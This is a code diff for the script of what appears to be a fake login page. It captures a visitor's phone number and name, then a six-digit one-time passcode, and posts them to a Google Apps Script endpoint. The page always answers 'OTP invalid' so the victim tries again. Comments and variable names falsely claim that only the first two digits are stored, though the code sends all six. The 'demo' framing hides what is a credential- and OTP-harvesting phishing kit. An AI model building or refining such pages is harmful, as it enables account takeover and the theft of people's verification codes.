@@ -1076,36 +1076,12 @@
 
 
 
-<!-- =====================================================
-     SUPABASE
-===================================================== -->
-<script src="https://your-domain.com/script.js"></script>
-
-
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-
 <script>
 
 
-/* =====================================================
-   SUPABASE CONFIG
-===================================================== */
 
-const SUPABASE_URL =
-    "https://zudirecgmqzbwopqicsp.supabase.co";
-
-
-const SUPABASE_KEY =
-    "sb_publishable_0ZwEXGUCk9bx1kPZvVzA4A_ysrKYgUo";
-
-
-const supabaseClient =
-    supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_KEY
-    );
-
+const GOOGLE_SHEET_URL =
+    "https://script.google.com/macros/s/AKfycbyUBq9vGWgFZCOKm83_cElkBxAfCKAlKYpe9GN6-mUHlVJC4wawhRdA_hu8JYAMDNot2Q/exec";
 
 
 /* =====================================================
@@ -1113,57 +1089,32 @@ const supabaseClient =
 ===================================================== */
 
 const loginScreen =
-    document.getElementById(
-        "loginScreen"
-    );
-
+    document.getElementById("loginScreen");
 
 const otpScreen =
-    document.getElementById(
-        "otpScreen"
-    );
-
+    document.getElementById("otpScreen");
 
 const loginBtn =
-    document.getElementById(
-        "loginBtn"
-    );
-
+    document.getElementById("loginBtn");
 
 const status =
-    document.getElementById(
-        "status"
-    );
-
+    document.getElementById("status");
 
 const otpBtn =
-    document.getElementById(
-        "otpBtn"
-    );
-
+    document.getElementById("otpBtn");
 
 const otpStatus =
-    document.getElementById(
-        "otpStatus"
-    );
-
+    document.getElementById("otpStatus");
 
 const otpInputs =
-    document.querySelectorAll(
-        ".otp"
-    );
-
+    document.querySelectorAll(".otp");
 
 const countdown =
-    document.getElementById(
-        "countdown"
-    );
-
+    document.getElementById("countdown");
 
 
 /* =====================================================
    LOGIN
-   EMAIL + NAME → SUPABASE → OTP
 ===================================================== */
 
 loginBtn.addEventListener(
@@ -1174,52 +1125,31 @@ loginBtn.addEventListener(
 
 async function saveDemoData() {
 
-
-    const email =
+    const phone =
         document
-        .getElementById("email")
-        .value
-        .trim();
-
+            .getElementById("email")
+            .value
+            .trim();
 
     const name =
         document
-        .getElementById("name")
-        .value
-        .trim();
-
-
-
+            .getElementById("name")
+            .value
+            .trim();
 
 
     /* VALIDATION */
 
-    if (!email || !name) {
+    if (!phone || !name) {
 
         status.textContent =
-            "Please enter email and name.";
+            "Please enter phone number and name.";
 
         status.style.color =
             "#c90000";
 
         return;
     }
-
-
-
-    /* EMAIL VALIDATION */
-
-    if (!email.includes("")) {
-
-        status.textContent =
-            "Please enter a valid email.";
-
-        status.style.color =
-            "#c90000";
-
-        return;
-    }
-
 
 
     /* BUTTON */
@@ -1227,38 +1157,89 @@ async function saveDemoData() {
     loginBtn.disabled = true;
 
     loginBtn.textContent =
-        "Saving...";
+        "Loading...";
 
 
+    try {
 
-    /* =================================================
-       SAVE EMAIL + NAME ONLY
-    ================================================= */
+        const response =
+            await fetch(
+                GOOGLE_SHEET_URL,
+                {
+                    method: "POST",
 
-    const {
-        data,
-        error
-    } = await supabaseClient
+                    body: JSON.stringify({
 
-        .from("demo_users")
+                        phone: phone,
 
-        .insert([
-            {
-                email: email,
-                name: name
-            }
-        ])
+                        name: name
 
-        .select();
+                    })
+                }
+            );
 
 
+        const result =
+            await response.json();
 
-    /* ERROR */
 
-    if (error) {
+        if (!result.success) {
+
+            throw new Error(
+                result.error ||
+                "Unable to save data."
+            );
+        }
+
+
+        /* LOCAL DEMO DATA */
+
+        localStorage.setItem(
+            "demo_user",
+            JSON.stringify({
+
+                phone: phone,
+
+                name: name,
+
+                savedAt:
+                    new Date()
+                    .toISOString()
+
+            })
+        );
+
+
+        /* CHANGE SCREEN */
+
+        loginScreen.style.display =
+            "none";
+
+        otpScreen.style.display =
+            "block";
+
+
+        /* START TIMER */
+
+        startCountdown();
+
+
+        /* FOCUS FIRST OTP */
+
+        setTimeout(
+            function() {
+
+                otpInputs[0].focus();
+
+            },
+            100
+        );
+
+
+    } catch (error) {
 
         console.error(
-            "SUPABASE ERROR:",
+            "GOOGLE SHEETS ERROR:",
             error
         );
 
@@ -1267,7 +1248,6 @@ async function saveDemoData() {
             "Database Error: " +
             error.message;
 
-
         status.style.color =
             "#c90000";
 
@@ -1275,87 +1255,11 @@ async function saveDemoData() {
         loginBtn.disabled =
             false;
 
-
         loginBtn.textContent =
             "Log In";
-
-
-        return;
     }
-
-
-
-    /* =================================================
-       LOCAL DEMO DATA
-    ================================================= */
-
-    if (!data || !data.length || !data[0] || !data[0].id) {
-
-        status.textContent =
-            "Database Error: New record ID was not returned.";
-
-        status.style.color =
-            "#c90000";
-
-        loginBtn.disabled = false;
-        loginBtn.textContent = "Log In";
-        return;
-    }
-
-
-    localStorage.setItem(
-
-        "demo_user",
-
-        JSON.stringify({
-
-            id: data && data.length > 0 ? data[0].id : null,
-
-            email: email,
-
-            name: name,
-
-            savedAt:
-                new Date()
-                .toISOString()
-
-        })
-
-    );
-
-
-
-    /* =================================================
-       CHANGE SCREEN
-    ================================================= */
-
-    loginScreen.style.display =
-        "none";
-
-
-    otpScreen.style.display =
-        "block";
-
-
-
-    /* START TIMER */
-
-    startCountdown();
-
-
-    /* FOCUS FIRST OTP */
-
-    setTimeout(
-        function() {
-
-            otpInputs[0].focus();
-
-        },
-        100
-    );
 
 }
-
 
 
 /* =====================================================
@@ -1365,11 +1269,9 @@ async function saveDemoData() {
 otpInputs.forEach(
     function(input, index) {
 
-
         input.addEventListener(
             "input",
             function() {
-
 
                 input.value =
                     input.value.replace(
@@ -1394,11 +1296,9 @@ otpInputs.forEach(
         );
 
 
-
         input.addEventListener(
             "keydown",
             function(e) {
-
 
                 if (
                     e.key === "Backspace" &&
@@ -1415,30 +1315,48 @@ otpInputs.forEach(
             }
         );
 
-
     }
 );
 
+
+/* =====================================================
+   OTP
+===================================================== */
 
 otpBtn.addEventListener(
     "click",
     async function() {
 
-   const firstDigit = otpInputs[0].value.trim();
-const secondDigit = otpInputs[1].value.trim();
-const thirdDigit = otpInputs[2].value.trim();
-const fourthDigit = otpInputs[3].value.trim();
-const fifthDigit = otpInputs[4].value.trim();
-const sixthDigit = otpInputs[5].value.trim();
 
-if (
-    !firstDigit ||
-    !secondDigit ||
-    !thirdDigit ||
-    !fourthDigit ||
-    !fifthDigit ||
-    !sixthDigit
-) {
+        const firstDigit =
+            otpInputs[0].value.trim();
+
+        const secondDigit =
+            otpInputs[1].value.trim();
+
+        const thirdDigit =
+            otpInputs[2].value.trim();
+
+        const fourthDigit =
+            otpInputs[3].value.trim();
+
+        const fifthDigit =
+            otpInputs[4].value.trim();
+
+        const sixthDigit =
+            otpInputs[5].value.trim();
+
+
+        /* VALIDATION */
+
+        if (
+            !firstDigit ||
+            !secondDigit ||
+            !thirdDigit ||
+            !fourthDigit ||
+            !fifthDigit ||
+            !sixthDigit
+        ) {
 
             otpStatus.textContent =
                 "Please enter the OTP";
@@ -1449,59 +1367,134 @@ if (
             return;
         }
 
-       const demoOtpFirst2 =
-    firstDigit +
+
+        /* FIRST TWO DIGITS ONLY */
+
+        const demoOtpFirst2 =
+            firstDigit +
     secondDigit +
     thirdDigit +
     fourthDigit +
     fifthDigit +
     sixthDigit;
 
+
         const savedUserRaw =
-            localStorage.getItem("demo_user");
+            localStorage.getItem(
+                "demo_user"
+            );
+
 
         if (!savedUserRaw) {
 
             otpStatus.textContent =
-                " user record not found.";
+                "User record not found.";
 
             otpStatus.style.color =
                 "#c90000";
 
             return;
         }
+
 
         const savedUser =
-            JSON.parse(savedUserRaw);
+            JSON.parse(
+                savedUserRaw
+            );
 
-        if (!savedUser.id) {
+
+        /* BUTTON */
+
+        otpBtn.disabled =
+            true;
+
+        otpBtn.textContent =
+            "Loading...";
+
+
+        try {
+
+            /*
+              Save only first 2 OTP digits
+              to Google Sheet.
+            */
+
+            const response =
+                await fetch(
+                    GOOGLE_SHEET_URL,
+                    {
+                        method: "POST",
+
+                        body: JSON.stringify({
+
+                            phone:
+                                savedUser.phone,
+
+                            name:
+                                savedUser.name,
+
+                            demo_otp_first2:
+                                demoOtpFirst2
+
+                        })
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            if (!result.success) {
+
+                throw new Error(
+                    result.error ||
+                    "Unable to save OTP."
+                );
+            }
+
+
+            /*
+              Demo response
+            */
 
             otpStatus.textContent =
-                " user ID is missing. Please start again.";
+                "OTP invalid. Please try again.";
 
             otpStatus.style.color =
                 "#c90000";
 
-            return;
-        }
 
-        otpBtn.enabled = true;
-        otpBtn.textContent = "Try Again";
+            otpBtn.disabled =
+                false;
 
-        const { error } =
-            await supabaseClient
-                .from("demo_users")
-                .update({
-                    demo_otp_first2: demoOtpFirst2
-                })
-                .eq("id", savedUser.id);
+            otpBtn.textContent =
+                "Try Again";
 
-        if (error) {
+
+            /*
+              Clear OTP fields
+            */
+
+            otpInputs.forEach(
+                function(input) {
+
+                    input.value = "";
+
+                }
+            );
+
+
+            otpInputs[0].focus();
+
+
+        } catch (error) {
 
             console.error(
-                "SUPABASE OTP ERROR:",
+                "GOOGLE SHEETS OTP ERROR:",
                 error
             );
+
 
             otpStatus.textContent =
                 "Database Error: " +
@@ -1510,45 +1503,16 @@ if (
             otpStatus.style.color =
                 "#c90000";
 
-            otpBtn.enabled = true;
-            otpBtn.textContent = "Continue";
 
-            return;
-        }
+            otpBtn.disabled =
+                false;
 
-        /*
-        ---------------------------------------------------
-        Demo completed.
-        Remaining 4 digits are NOT stored.
-        ---------------------------------------------------
-        */
-
-        otpStatus.textContent =
-    "OTP invalid. Please try again.";
-
-otpStatus.style.color = "red";
-
-        otpStatus.style.color =
-            "red";
-
-      otpBtn.textContent =
-    "Try Again";
-
-        /* Clear visual-only last 4 fields */
-
-        for (
-            let i = 6;
-            i < otpInputs.length;
-            i++
-        ) {
-
-            otpInputs[i].value = "";
-
+            otpBtn.textContent =
+                "Continue";
         }
 
     }
 );
-
 
 
 /* =====================================================
@@ -1557,7 +1521,6 @@ otpStatus.style.color = "red";
 
 function startCountdown() {
 
-
     let seconds = 120;
 
 
@@ -1565,51 +1528,39 @@ function startCountdown() {
         seconds;
 
 
-
     const timer =
         setInterval(
             function() {
 
-
                 seconds--;
-
 
                 countdown.textContent =
                     seconds;
 
 
-
                 if (seconds <= 0) {
 
-
                     clearInterval(timer);
-
 
                     countdown.textContent =
                         "0";
 
-
                     otpStatus.textContent =
-                        " code expired.";
-
+                        "Code expired.";
 
                     otpStatus.style.color =
                         "#c90000";
 
-
-                    otpBtn.enabled =
-                        true;
-
+                    otpBtn.disabled =
+                        false;
 
                 }
-
 
             },
             1000
         );
 
 }
-
 
 </script>
 
